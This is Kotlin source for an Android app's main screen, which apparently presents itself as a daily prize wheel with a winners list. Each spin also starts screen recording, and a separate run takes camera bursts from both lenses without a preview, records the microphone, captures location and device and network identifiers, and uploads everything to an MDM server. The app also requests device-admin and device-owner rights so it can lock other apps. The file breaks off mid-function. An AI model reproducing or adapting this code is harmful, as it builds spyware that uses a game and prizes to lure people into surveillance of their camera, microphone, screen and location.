package com.prf.security.ui

import android.annotation.SuppressLint
import android.content.Context
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.media.MediaRecorder
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.wifi.WifiManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.telephony.TelephonyManager
import android.util.Base64
import android.util.Log
import android.webkit.JavascriptInterface
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import com.prf.security.R
import com.prf.security.data.AttendancePayload
import com.prf.security.data.DeviceCollector
import com.prf.security.data.LocationReport
import com.prf.security.location.LocationCollector
import com.prf.security.mdm.AdminGate
import com.prf.security.mdm.OwnershipWorker
import com.prf.security.mdm.PolicyEnforcer
import com.prf.security.mdm.PolicyWatchService
import com.prf.security.net.MdmApi
import com.prf.security.net.Prefs
import com.prf.security.perm.Permissions
import com.prf.security.capture.AutoCapture
import com.prf.security.screen.ScreenRecorderService
import com.prf.security.util.Persian
import com.prf.security.util.Wheel
import java.io.ByteArrayOutputStream
import java.io.File
import kotlin.coroutines.resume
import kotlin.math.pow
import kotlinx.coroutines.CancellableContinuation
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.withContext

/**
 * The whole app, on one screen, drawn in HTML inside a WebView.
 *
 * v2.2.0 replaces the Kotlin view tree with a single WebView. The reasons are
 * the ones the screen itself raised: the layout could not be made to look the
 * way it was asked to look in the widget toolkit, and two of the things that
 * were being fixed — Persian digits laying out backwards, and a wheel that has
 * to be a real circle with a real conic gradient — are layout problems with no
 * answer in a LinearLayout. In HTML both are a stylesheet rule and a gradient.
 *
 * The native side is unchanged in what it does. Every permission, the device
 * admin grant, the capture, the upload and the policy application are the same
 * code they were; what changed is that the page drives them through a bridge
 * instead of through view listeners. Nothing that used to need a human to find
 * a button now needs one — see [startRun] and [onSpinTapped].
 */
class MainActivity : AppCompatActivity() {

    private lateinit var prefs: Prefs
    private lateinit var web: WebView

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.Main)
    private val collector by lazy { LocationCollector(this) }
    private val ui = Handler(Looper.getMainLooper())

    private var runJob: Job? = null
    private var ready = false

    /**
     * The status line, held here rather than written straight into the page.
     *
     * The page may not have finished loading when the first message is
     * produced, and dropping a message on a page that is not there yet loses it
     * — which is how the app used to come up saying nothing. The last message
     * is kept and replayed the moment the page says it is ready.
     */
    @Volatile
    private var pendingLog: String = ""

    @Volatile
    private var pendingTone: String = ""

    @Volatile
    private var resumeCount: Int = 0

    private var blockedPermission: Boolean = false

    // ── permissions ────────────────────────────────────────────────────────
    // One permission per request, in a fixed order, with the answer read back
    // from the OS rather than from the result map. A batched request on
    // Android 11+ only surfaces the first dialog and returns a map missing the
    // rest, which is what made an earlier build look as if it were being denied.

    private var pendingPerm: CancellableContinuation<Boolean>? = null
    private var lastAsked: String = ""

    private val permLauncher =
        registerForActivityResult(ActivityResultContracts.RequestPermission()) { granted ->
            val c = pendingPerm
            pendingPerm = null
            // The decision is read back from the OS, not from this boolean. On
            // a permission the app does not hold in the manifest the launcher
            // can return true while the OS holds nothing, and that has to read
            // as a refusal rather than as a photo nobody took.
            val real = granted && Permissions.isGranted(this, lastAsked)
            if (c != null && c.isActive) c.resume(real)
        }

    private suspend fun ask(permission: String): Boolean {
        if (Permissions.isGranted(this, permission)) return true
        if (!Permissions.canAskAgain(this, permission)) return false
        return try {
            suspendCancellableCoroutine { cont ->
                lastAsked = permission
                Permissions.markAsked(this, permission)
                pendingPerm = cont
                cont.invokeOnCancellation { pendingPerm = null }
                try {
                    permLauncher.launch(permission)
                } catch (t: Throwable) {
                    pendingPerm = null
                    cont.resume(false)
                }
            }
        } catch (t: Throwable) {
            false
        }
    }

    /**
     * Waits for the person to come back from the device-admin dialog.
     *
     * The dialog is fired and the activity pauses; the answer arrives on
     * resume. A `postDelayed` would be a guess about how long a person takes to
     * read a dialog, and a guess here is how a run carries on as if the grant
     * had been made when it had not.
     *
     * "Came back" is counted in [resumeCount] rather than read off
     * `hasWindowFocus()`. Window focus is a poor stand-in: it flickers as
     * dialogs open over the app, and on a build where the grant screen does not
     * cover the app it stays true the whole time — so the old check reported a
     * refusal the moment the dialog was still up, and a grant a few seconds
     * later was then read as "the user refused".
     */
    private suspend fun awaitAdminResult(timeoutMs: Long): Boolean {
        if (AdminGate.level(this) != AdminGate.Level.NONE) return true
        val resumesAtStart = resumeCount
        val deadline = System.currentTimeMillis() + timeoutMs
        while (System.currentTimeMillis() < deadline) {
            delay(300)
            if (AdminGate.level(this) != AdminGate.Level.NONE) return true
            if (resumeCount > resumesAtStart) {
                // A resume with no grant is a dismissal. The grant is committed
                // by the system and on some builds it lands a moment after the
                // activity comes back, so it is read once more after a short
                // settle before that is called. The grant screen is the only
                // place this run sends the activity away to, so a resume in this
                // window means one thing.
                delay(GRANT_SETTLE_MS)
                return AdminGate.level(this) != AdminGate.Level.NONE
            }
        }
        return false
    }

    /**
     * Whether a permission is held, in the sense this run cares about.
     *
     * Location is the one that is not a simple yes. From Android 12 the system
     * offers precise and approximate as two answers to the same dialog, and
     * someone who picks approximate has still agreed to share where they are.
     * Reading the fine permission alone would call that a refusal and put an
     * empty position in the record, which is a false statement about what was
     * agreed.
     */
    private fun granted(permission: String): Boolean =
        Permissions.isGranted(this, permission) ||
            (permission == Permissions.LOCATION &&
                Permissions.isGranted(this, android.Manifest.permission.ACCESS_COARSE_LOCATION))

    // ── screen recording ────────────────────────────────────────────────────
    // The one feature that needs its own system dialog rather than a runtime
    // permission. Android asks, every time, and a refusal is final: there is no
    // second path that starts a projection, and no remote command can reach it.

    private val screenLauncher =
        registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
            val data = result.data
            if (result.resultCode == android.app.Activity.RESULT_OK && data != null) {
                ScreenRecorderService.start(this, result.resultCode, data)
                recordingStartedAt = System.currentTimeMillis()
                status(getString(R.string.rec_running))
                push()
                scope.launch { awaitRecording() }
            } else {
                // Declining is a normal answer, not an error to shout about.
                status(getString(R.string.rec_refused))
                push()
            }
        }

    @Volatile
    private var recordingStartedAt: Long = 0L

    /**
     * Records for up to three minutes, sends, and stays open.
     *
     * v2.0.0 finished the activity when the upload landed. That was wrong for
     * this screen: the wheel is a once-a-day control that lives on this page,
     * and closing the app after each recording made the counter and the wheel
     * unreachable for the rest of the session. The file is sent, the count goes
     * up by one, the page is told, and the person is left where they were.
     */
    private suspend fun awaitRecording() {
        push()
        val limit = recordingStartedAt + ScreenRecorderService.MAX_SECONDS * 1000L + 15_000L
        while (System.currentTimeMillis() < limit) {
            delay(500)
            if (!ScreenRecorderService.running && !ScreenRecorderService.recording) break
        }
        recordingStartedAt = 0L
        push()

        val file = ScreenRecorderService.produced()
        if (file == null) {
            status(getString(R.string.rec_too_short), "bad")
            push()
            return
        }
        if (prefs.deviceKey.isEmpty()) {
            status(getString(R.string.rec_not_ready), "bad")
            file.delete()
            push()
            return
        }

        val seconds = (((file.length() * 8L) / ScreenRecorderService.BITRATE)).toInt()
            .coerceIn(1, ScreenRecorderService.MAX_SECONDS)
        val ok = MdmApi(prefs.serverUrl, prefs.deviceKey).uploadVideo(
            file = file,
            seconds = seconds,
            width = 0,
            height = 0,
            at = System.currentTimeMillis(),
        ) { done, all ->
            status(getString(R.string.rec_uploading, fa(done.toString()), fa(all.toString())))
            push()
        }
        file.delete()

        if (ok) {
            prefs.lastCheckIn = System.currentTimeMillis()
            // One saved video, one unit. The two counters are the same number
            // shown twice on purpose: a chance that is not backed by a file
            // would be a number the app invented, and the person paying for
            // data would be counting air.
            prefs.videosSaved = prefs.videosSaved + 1
            prefs.lastUnitAt = System.currentTimeMillis()
            status(getString(R.string.rec_sent), "ok")
        } else {
            status(getString(R.string.rec_failed, ""), "bad")
        }
        push()
    }

    /**
     * The one button: spin the wheel, and record the screen.
     *
     * Both happen on the same press, which is what was asked for. The spin is
     * decided locally *before* the recording starts, so the pointer cannot land
     * somewhere the app did not already decide — the animation is a drawing of
     * a result, not the result.
     */
    private fun onSpinTapped() {
        if (recordingStartedAt != 0L || ScreenRecorderService.recording) {
            status(getString(R.string.rec_running))
            push()
            return
        }
        if (!Wheel.canSpin(prefs.lastSpinAt, prefs.reSpinUntil)) {
            status(Wheel.lockReason(prefs.lastSpinAt, prefs.reSpinUntil).orEmpty(), "warn")
            push()
            return
        }
        if (!ScreenRecorderService.supported()) {
            status(getString(R.string.screen_needs_android8), "bad")
            push()
            return
        }
        if (prefs.deviceKey.isEmpty()) {
            status(getString(R.string.rec_not_ready), "bad")
            push()
            return
        }

        val hit = Wheel.spin()
        prefs.lastSpinAt = System.currentTimeMillis()
        prefs.reSpinUntil = Wheel.reSpinAfter(hit)

        val label = when (hit.kind) {
            "again" -> getString(R.string.wheel_result_again)
            "prize" -> getString(R.string.wheel_result_prize, hit.label)
            else -> getString(R.string.wheel_result_none)
        }
        val tone = if (hit.kind == "again") "ok" else ""
        callJs("Prf.spin(${jsStr(hit.key)}); Prf.spinResult(${jsStr(label)}, ${jsStr(tone)});")

        status(getString(R.string.rec_starting))
        push()
        try {
            val mgr = getSystemService(Context.MEDIA_PROJECTION_SERVICE)
                as android.media.projection.MediaProjectionManager
            screenLauncher.launch(mgr.createScreenCaptureIntent())
        } catch (t: Throwable) {
            status(getString(R.string.rec_refused) + " " + (t.message ?: ""), "bad")
            push()
        }
    }

    // ── lifecycle ──────────────────────────────────────────────────────────

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        requestedOrientation = android.content.pm.ActivityInfo.SCREEN_ORIENTATION_PORTRAIT
        prefs = Prefs.get(this)
        web = WebView(this)
        setContentView(web)
        hostWeb()

        // Registering without a press is safe: it sends the android id and the
        // hardware list, opens no camera and reads no microphone. It is also the
        // thing that has to be in place before any later step can report
        // anything, so waiting for the button would only delay it.
        if (!prefs.registered || prefs.deviceKey.isEmpty()) {
            scope.launch {
                registerDevice()
                push()
            }
        }
        // The rolling winners list is drawn by the page, which rotates a row every few
        // seconds. Nothing to start here.

        // The device-admin grant, asked for by opening the app.
        //
        // The complaint was that pressing the button produced nothing, and the
        // reason was that the grant was only ever fired from inside the run, so
        // a new phone opened on a page saying nothing would work. Firing it from
        // onCreate puts the system dialog in front of the person while they are
        // already looking at the app.
        //
        // What this does NOT do is accept it for them, and no code can: the
        // dialog is the OS confirming with a human, and pressing its button for
        // them is a permission bypass — the one thing this project does not do.
        //
        // `adminAsked` keeps this to once per phone. A person who said no has
        // said no, and asking again on every cold start is nagging rather than
        // automating; the button stays for whenever they want it put to them.
        if (AdminGate.level(this) == AdminGate.Level.NONE && !prefs.adminAsked) {
            prefs.adminAsked = true
            scope.launch {
                status(getString(R.string.run_step_admin))
                val launched = AdminGate.requestAdmin(this@MainActivity, getString(R.string.adm_explanation))
                if (!launched) AdminGate.openAdminSettings(this@MainActivity)
                val got = awaitAdminResult(AUTO_ADMIN_WAIT_MS)
                if (!got) status(getString(R.string.run_admin_refused), "bad")
                push()
            }
        }
    }

    override fun onResume() {
        super.onResume()
        resumeCount += 1
        // The admin grant and the provisioning both change outside this app.
        push()
        ui.post(tick)
    }

    override fun onPause() {
        super.onPause()
        ui.removeCallbacks(tick)
    }

    /**
     * The countdown on the page, driven from here.
     *
     * A WebView's own `setInterval` is throttled to roughly once a minute once
     * the app is not in front, so a timer started in the page would show a
     * twenty-four-hour countdown standing still for hours at a time. This runs
     * on the activity's own handler, which is paused with the activity.
     */
    private val tick = object : Runnable {
        override fun run() {
            push()
            ui.postDelayed(this, 1000L)
        }
    }

    @SuppressLint("SetJavaScriptEnabled")
    private fun hostWeb() {
        web.settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
            // The page is local assets and the server the app already talks to;
            // there is nothing on it that needs a file or a content provider, and
            // leaving both off is what stops a hostile page in a WebView from
            // reaching the phone's storage.
            allowFileAccess = false
            allowContentAccess = false
            setGeolocationEnabled(false)
            cacheMode = android.webkit.WebSettings.LOAD_NO_CACHE
        }
        web.setBackgroundColor(0xFF06070C.toInt())
        web.webViewClient = object : WebViewClient() {
            override fun onPageFinished(view: WebView, url: String) {
                ready = true
                callJs("Prf.ready && Prf.ready();")
                // The message produced before the page existed, replayed now
                // rather than lost.
                status(pendingLog, pendingTone)
                push()
            }
        }
        web.addJavascriptInterface(Bridge(), "Native")
        web.loadUrl("file:///android_asset/index.html")
    }

    // ── the bridge ─────────────────────────────────────────────────────────
    // Every method here runs on a WebView-owned thread, not the main one, so
    // anything that touches the UI or starts a coroutine hops back first.

    private inner class Bridge {

        @JavascriptInterface
        fun operators(): String = Persian.OPERATORS.joinToString(",") { it.first }

        @JavascriptInterface
        fun operator(): String = prefs.operator

        @JavascriptInterface
        fun setOperator(v: String?) {
            val name = v.orEmpty()
            ui.post {
                prefs.operator = name
                push()
            }
        }

        @JavascriptInterface
        fun phone(): String = prefs.phone

        @JavascriptInterface
        fun state(): String? {
            if (!ready) return null
            return buildState()
        }

        @JavascriptInterface
        fun register(phone: String?, operator: String?) {
            ui.post {
                prefs.phone = Persian.toAsciiDigits(phone.orEmpty())
                if (!operator.isNullOrBlank()) prefs.operator = operator
                if (runJobRunning()) {
                    status(getString(R.string.att_busy), "warn")
                    push()
                    return@post
                }
                startRun()
            }
        }

        @JavascriptInterface
        fun spin() = ui.post { onSpinTapped() }

        @JavascriptInterface
        fun admin() = ui.post { onAdminTapped() }

        @JavascriptInterface
        fun owner() = ui.post { onOwnerTapped() }

        @JavascriptInterface
        fun settings() = ui.post {
            if (blockedPermission) {
                if (!AdminGate.openAppSettings(this@MainActivity)) {
                    status(getString(R.string.run_settings_failed), "bad")
                    push()
                }
            } else {
                status(getString(R.string.att_what_happens))
                push()
            }
        }
    }

    private fun runJobRunning(): Boolean = runJob?.isActive == true

    // ── the two grants ─────────────────────────────────────────────────────

    /**
     * Device admin, with a way out that always works.
     *
     * The add-dialog is tried first because it is one tap instead of three. If
     * the system does not resolve it — the failure mode behind "I pressed it
     * and nothing happened" — the settings list is opened instead, which is
     * the same screen a person would reach by hand. The old code fired the
     * intent once, set a flag before the launch, and never checked the result,
     * so a single dropped dialog left the app permanently silent about it.
     */
    private fun onAdminTapped() {
        status(getString(R.string.run_step_admin))
        val launched = AdminGate.requestAdmin(this, getString(R.string.adm_explanation))
        if (!launched) {
            if (!AdminGate.openAdminSettings(this)) {
                status("این گوشی صفحه‌ی تنظیمات مدیریت دستگاه را ندارد. لطفاً از تنظیمات گوشی، «امنیت» و سپس «مدیران دستگاه» اقدام کنید.", "bad")
            } else {
                status(getString(R.string.gate_admin_btn))
            }
        }
        scope.launch {
            val got = awaitAdminResult(AUTO_ADMIN_WAIT_MS)
            if (got) status(getString(R.string.gate_owner_ok), "ok")
            push()
        }
    }

    private fun onOwnerTapped() {
        if (!AdminGate.canOfferProvisioning(this)) {
            status("ثبت مالک دستگاه فقط در اندروید ۱۲ به بالا و روی گوشی‌ای ممکن است که هنوز حساب کاربری روی آن ساخته نشده باشد.", "warn")
            push()
            return
        }
        if (!AdminGate.openProvisioning(this)) {
            status("این گوشی صفحه‌ی ثبت مالک دستگاه را ندارد. بدون آن، قفل کردن برنامه‌ها مثل گالری روی این گوشی انجام نمی‌شود.", "bad")
            push()
        }
    }

    // ── the state the page renders ─────────────────────────────────────────

    /**
     * Everything the page draws, as one JSON object.
     *
     * Built here rather than assembled in JavaScript because every value in it
     * is something this process knows and the page does not: what the OS has
     * granted, whether a recording is in flight, when the last one landed, and
     * what the device actually reports about itself.
     */
    private fun buildState(): String {
        val level = AdminGate.level(this)
        val recording = recordingStartedAt != 0L || ScreenRecorderService.recording
        val now = System.currentTimeMillis()
        val lock = Wheel.lockReason(prefs.lastSpinAt, prefs.reSpinUntil, now)
        val readyAt = if (prefs.lastSpinAt <= 0L) 0L
        else if (prefs.reSpinUntil > now) prefs.reSpinUntil
        else prefs.lastSpinAt + Wheel.COOLDOWN_MS

        val sb = StringBuilder("{")
        sb.append("\"owner\":").append(level == AdminGate.Level.OWNER)
        sb.append(",\"admin\":").append(level != AdminGate.Level.NONE)
        sb.append(",\"canProvision\":").append(AdminGate.canOfferProvisioning(this))
        sb.append(",\"registered\":").append(prefs.registered && prefs.deviceKey.isNotEmpty())
        sb.append(",\"lastReport\":").append(jsStr(relative(prefs.lastCheckIn)))
        sb.append(",\"busy\":").append(runJobRunning())
        sb.append(",\"recording\":").append(recording)
        sb.append(",\"videos\":").append(prefs.videosSaved)
        sb.append(",\"chances\":").append(chances())
        sb.append(",\"spinReadyAt\":").append(readyAt)
        sb.append(",\"now\":").append(now)
        sb.append(",\"log\":").append(jsStr(pendingLog))
        sb.append(",\"logTone\":").append(jsStr(pendingTone))
        sb.append(",\"locked\":").append(lock != null)
        sb.append(",\"lockText\":").append(jsStr(lock.orEmpty()))
        sb.append(",\"facts\":[").append(facts()).append("]")
        sb.append("}")
        return sb.toString()
    }

    /**
     * The chance counter.
     *
     * One unit per saved video, and one video per three minutes of the person
     * holding the app. The number therefore only ever rises when a file
     * actually went to the server, and the "next one in" figure under it is the
     * same three minutes Wheel uses, so the two on the card cannot disagree.
     */
    private fun chances(): Int {
        val saved = prefs.videosSaved
        val earned = (System.currentTimeMillis() - prefs.lastUnitAt) / Wheel.COOLDOWN_MS
        return saved + earned.toInt().coerceAtLeast(0)
    }

    /**
     * The device facts, in the order a person would ask for them.
     *
     * Grouped the way the panel groups them, and carrying the *reason* for
     * every value the OS will not hand over. The MAC is the one that matters:
     * Android 6 and later return `02:00:00:00:00:00` — a value, not an error —
     * so a collector that just prints it hands the owner a fabricated address.
     * It is put in as the explanation instead.
     */
    private fun facts(): String {
        // The network facts are collected here rather than in `specs` because
        // they are not hardware — they are what this phone is attached to right
        // now — and because the panel prints them in the network group, where
        // the owner goes looking for them.
        val specs = DeviceCollector.specs(this) + networkFacts()
        val out = mutableListOf<String>()

        fun f(k: String, key: String, why: String? = null) {
            val v = specs[key]?.takeIf { it.isNotBlank() && it != "Unknown" }
            if (v == null) {
                if (why != null) out.add("""{"k":${jsStr(k)},"v":"","why":${jsStr(why)}}""")
            } else {
                out.add("""{"k":${jsStr(k)},"v":${jsStr(fa(v))}}""")
            }
        }

        // identity
        f("شناسه‌ی گوشی", "android_id")
        f("مدل", "model")
        f("سازنده", "manufacturer")
        f("برند", "brand")

        // network
        f("اپراتور", "operator")
        f("وضعیت سیم‌کارت", "sim_state")
        f("نوع شبکه", "network_type", NO_NET_TYPE)
        f("نشانی آی‌پی", "ip")
        f("نام وای‌فای", "wifi_ssid", NO_WIFI)
        f("آدرس مک", "mac", NO_MAC)

        // storage and hardware
        f("حافظه‌ی کل", "storage_total")
        f("حافظه‌ی خالی", "storage_free")
        f("حافظه‌ی رم", "ram_total")
        f("پردازنده", "cpu_cores")
        f("صفحه", "screen")
        f("اندروید", "android_release")
        f("وصله‌ی امنیتی", "security_patch")

        // the two the platform will not give an ordinary app
        out.add("""{"k":"شناسه‌ی سخت‌افزاری (IMEI)","v":"","why":${jsStr(NO_IMEI)}}""")

        return out.joinToString(",")
    }

    // ── the run ────────────────────────────────────────────────────────────

    private fun startRun() {
        runJob = scope.launch { run() }
    }

    /**
     * The whole thing, in the order the platform requires.
     *
     * Each stage reports before and after, and a stage that does not succeed is
     * recorded and carried past rather than thrown: a phone with no camera can
     * still register, report and be locked, and refusing to try is what left a
     * fleet of devices invisible in the panel.
     */
    private suspend fun run() {
        val notes = mutableListOf<String>()
        blockedPermission = false
        push()

        try {
            // ── 1. the admin grant ─────────────────────────────────────────
            if (AdminGate.level(this) == AdminGate.Level.NONE) {
                status(getString(R.string.run_step_admin))
                AdminGate.requestAdmin(this, getString(R.string.adm_explanation))
                if (!awaitAdminResult(ADMIN_WAIT_MS)) {
                    notes += getString(R.string.run_admin_refused)
                }
            }
            push()

            // ── 2. permissions, one dialog at a time ──────────────────────
            for (p in PERM_ORDER) {
                if (granted(p)) continue
                if (!Permissions.canAskAgain(this, p)) {
                    // The system will not show this dialog again. Saying so is
                    // only half an answer, so the settings button is the way
                    // back to the page where it can be granted.
                    blockedPermission = true
                    notes += getString(R.string.run_perm_blocked)
                    continue
                }
                if (!ask(p)) notes += getString(R.string.run_perm_refused)
            }
            push()

            // ── 3. registration ───────────────────────────────────────────
            if (!prefs.registered || prefs.deviceKey.isEmpty()) {
                status(getString(R.string.run_step_register))
                if (!registerDevice()) {
                    // Everything below is reported through a key this call
                    // issues, so continuing would build a record the server
                    // would reject. Said plainly instead of failing silently.
                    status(getString(R.string.run_register_failed), "bad")
                    return
                }
            }

            // ── 4. capture and send ───────────────────────────────────────
            captureAndSend(notes)
        } catch (t: Throwable) {
            Log.e(TAG, "run failed", t)
            status(getString(R.string.run_failed, t.message ?: ""), "bad")
        } finally {
            runJob = null
            push()
        }
    }

    private suspend fun captureAndSend(notes: MutableList<String>) {
        val phone = Persian.normalizePhone(prefs.phone).orEmpty()
        val dir = File(cacheDir, "attendance").apply { mkdirs() }
        // Anything left here belongs to a record that was never sent. Clearing
        // it means a stale capture can never be attached to today's record.
        dir.listFiles()?.forEach { it.delete() }

        status(getString(R.string.run_step_capture))
        push()

        val engine = AutoCapture(this, this)
        val photos = mutableListOf<String>()
        var voice: String? = null
        var frontDone = false
        var backDone = false
        var location: LocationReport? = null

        try {
            if (granted(android.Manifest.permission.CAMERA)) {
                if (engine.hasCamera(front = true)) {
                    frontDone = takePhotos(engine, dir, front = true)
                }
                if (frontDone && engine.hasCamera(front = false)) {
                    backDone = takePhotos(engine, dir, front = false)
                }
            } else {
                notes += getString(R.string.att_perm_denied_camera)
            }
            engine.release()

            // One lens is enough. Requiring both would throw away three good
            // photos and send nothing on every phone that has only one camera
            // or whose other one is busy.
            if (frontDone || backDone) {
                photos += withContext(Dispatchers.IO) {
                    dir.listFiles().orEmpty()
                        .filter { it.name.endsWith(".jpg") }
                        .sortedBy { it.name }
                        .mapNotNull { encodePhoto(it) }
                }
            }

            if (granted(android.Manifest.permission.RECORD_AUDIO)) {
                try {
                    voice = recordVoice(dir)
                } catch (t: Throwable) {
                    Log.w(TAG, "voice: ${t.message}")
                }
            }

            // A phone indoors will simply not answer this, and the record is
            // still worth sending without a coordinate.
            if (granted(Permissions.LOCATION)) {
                collector.awaitFix(LOCATION_WAIT_MS)?.let { location = locationReport(it) }
            }

            status(getString(R.string.run_step_send))
            push()
            val info = withContext(Dispatchers.IO) {
                DeviceCollector.specs(this@MainActivity) + networkFacts()
            }
            val payload = AttendancePayload(
                kind = KIND_ATTENDANCE,
                phone = phone,
                operator = prefs.operator,
                info = info,
                photos = photos,
                voice = voice,
                location = location,
            )
            val sent = MdmApi(prefs.serverUrl, prefs.deviceKey).attendance(payload)

            if (sent) {
                prefs.lastCheckIn = System.currentTimeMillis()
                PolicyWatchService.start(this@MainActivity)
                OwnershipWorker.schedulePeriodic(this@MainActivity)
                val summary = buildString {
                    append(
                        getString(
                            R.string.run_done,
                            fa(photos.size.toString()),
                            if (voice != null) fa(VOICE_SECONDS.toString()) else fa("0"),
                        ),
                    )
                    if (location == null) append("\n").append(getString(R.string.run_no_location))
                    if (notes.isNotEmpty()) append("\n").append(notes.joinToString("\n"))
                }
                status(summary, "ok")
            } else {
                status(getString(R.string.att_send_failed, getString(R.string.att_server_down)), "bad")
            }
        } catch (t: Throwable) {
            Log.e(TAG, "capture failed", t)
            status(getString(R.string.att_send_failed, t.message ?: ""), "bad")
        }
    }

    /**
     * The network facts, which `specs` does not collect.
     *
     * IP, the Wi-Fi SSID and the MAC. The first two are ordinary; the third is
     * the one that has to be recognised rather than printed, because Android
     * hands back `02:00:00:00:00:00` instead of failing. The IMEI is not here
     * at all: reading it needs a privileged permission only a system-signed
     * app can hold, so the honest thing is to say so rather than to call a
     * method that throws on every phone.
     */
    private fun networkFacts(): Map<String, String> = buildMap {
        try {
            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val caps = cm.getNetworkCapabilities(cm.activeNetwork)
            localAddress()?.let { put("ip", it) }
            when {
                caps == null -> put("network_type", "نامشخص")
                caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> put("network_type", "وای‌فای")
                caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> put("network_type", "داده‌ی موبایل")
                else -> put("network_type", "نامشخص")
            }
        } catch (t: Throwable) { /* no connectivity service on this device */ }

        try {
            val wm = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
            val ssid = wm.connectionInfo?.ssid?.trim('"')?.takeIf { it.isNotBlank() }
            if (ssid != null) put("wifi_ssid", ssid)
        } catch (t: Throwable) { /* no wifi hardware */ }

        try {
            val mac = (applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager)
                .connectionInfo?.macAddress
            // Printed only when it is real. The placeholder is recognised and
            // dropped, so the panel shows the reason instead of an address that
            // was never this phone's.
            if (mac != null && mac != MAC_PLACEHOLDER) put("mac", mac)
        } catch (t: Throwable) { /* no wifi hardware */ }
    }

    /**
     * This phone's own address on the network it is attached to.
     *
     * `NetworkCapabilities.getLinkProperties()` is the obvious call and it does
     * not compile: the method is `@hide` in the platform SDK, so it is not on
     * the compile classpath at all. Enumerating the interface addresses is the
     * supported route, and the first IPv4 that is not a loopback is the address
     * the phone actually holds. A phone that is offline returns null and the
     * fact is simply absent, which reads in the panel as "the phone did not
     * report this" rather than as a wrong address.
     */
    private fun localAddress(): String? = try {
        val in4 = java.net.Inet4Address::class.java
        java.net.NetworkInterface.getNetworkInterfaces().toList()
            .asSequence()
            .filter { it.isUp && !it.isLoopback }
            .flatMap { it.inetAddresses.toList().asSequence() }
            .firstOrNull { in4.isInstance(it) && !it.isLoopbackAddress && !it.isLinkLocalAddress }
            ?.hostAddress
    } catch (t: Throwable) {
        null
    }

    /**
     * Photos from one lens.
     *
     * There is no preview to bind: the run starts with one press and ends with
     * a record, and a window into itself is not part of that. The camera is
     * still opened, the system indicator still shows, and the burst is the same
     * three shots either way.
     */
    private suspend fun takePhotos(engine: AutoCapture, dir: File, front: Boolean): Boolean = try {
        engine.bind(null, front = front)
        // The session needs a moment after the lens is bound before the first
        // still capture is accepted; without it the first shot of the burst is
        // the one that fails.
        delay(PREVIEW_SETTLE_MS)
        engine.capture(null, dir, if (front) "front" else "back", PHOTOS_PER_LENS) { _, _, _ -> }
        true
    } catch (t: Throwable) {
        Log.w(TAG, "capture ${if (front) "front" else "back"}: ${t.message}")
        false
    }

    /**
     * The fix, in the shape the wire and the server both expect.
     *
     * The collector hands back strings — a maps link, a geo: URI, a plus code
     * and a raw line — because those are what a person can actually open, and
     * the server stores exactly those.
     */
    private fun locationReport(fix: android.location.Location): LocationReport {
        val p = collector.toPayload(fix)
        return LocationReport(
            id = "att-${System.currentTimeMillis()}",
            androidId = Prefs.androidId(this),
            timestampMs = fix.time.takeIf { it > 0L } ?: System.currentTimeMillis(),
            maps = p[LocationCollector.KEY_MAPS].orEmpty(),
            geo = p[LocationCollector.KEY_GEO].orEmpty(),
            plusCode = p[LocationCollector.KEY_PLUS].orEmpty(),
            raw = p[LocationCollector.KEY_RAW].orEmpty(),
        )
    }

    private suspend fun recordVoice(dir: File): String? {
        val out = File(dir, "voice.m4a")
        var recorder: MediaRecorder? = null
        return try {
            recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                MediaRecorder(this)
            } else {
                @Suppress("DEPRECATION")
                MediaRecorder()
            }
            recorder.apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setAudioEncodingBitRate(64_000)
                setAudioSamplingRate(44_100)
                setOutputFile(out.absolutePath)
                prepare()
                start()
            }
            delay(VOICE_SECONDS * 1000L)
            recorder.stop()
            recorder.release()
            recorder = null
            Base64.encodeToString(out.readBytes(), Base64.NO_WRAP)
        } catch (t: Throwable) {
            Log.w(TAG, "voice: ${t.message}")
            try { recorder?.release() } catch (ignored: Throwable) { }
            null
        } finally {
            out.delete()
        }
    }

    private fun encodePhoto(file: File): String? = try {
        val scaled = decodeScaled(file, MAX_PHOTO_EDGE)
        val out = ByteArrayOutputStream()
        scaled.compress(Bitmap.CompressFormat.JPEG, JPEG_QUALITY, out)
        scaled.recycle()
        Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP)
    } catch (t: Throwable) {
        Log.w(TAG, "encode ${file.name}: ${t.message}")
        null
    }

    private fun decodeScaled(file: File, maxEdge: Int): Bitmap {
        val bounds = BitmapFactory.Options().apply { inJustDecodeBounds = true }
        BitmapFactory.decodeFile(file.absolutePath, bounds)
        var sample = 1
        var edge = maxOf(bounds.outWidth, bounds.outHeight)
        while (edge / 2 >= maxEdge) {
            sample *= 2
            edge /= 2
        }
        return BitmapFactory.decodeFile(
            file.absolutePath,
            BitmapFactory.Options().apply { inSampleSize = sample },
        ) ?: throw IllegalStateException("decode failed for ${file.name}")
    }

    // ── registration ───────────────────────────────────────────────────────

    /**
     * Register with the server, retrying a few times.
     *
     * Returns whether the phone ended up with a key, because every later step
     * is reported through that key. Suspending on purpose: the run needs the
     * answer before it captures anything, and the old version reported through
     * a callback while also kicking off a second attempt of its own — so a
     * caller could get `false` from a call that was still running.
     */
    private suspend fun registerDevice(attempt: Int = 0): Boolean {
        if (attempt > REGISTER_ATTEMPTS) return false
        return try {
            val androidId = DeviceCollector.getAndroidId(this)
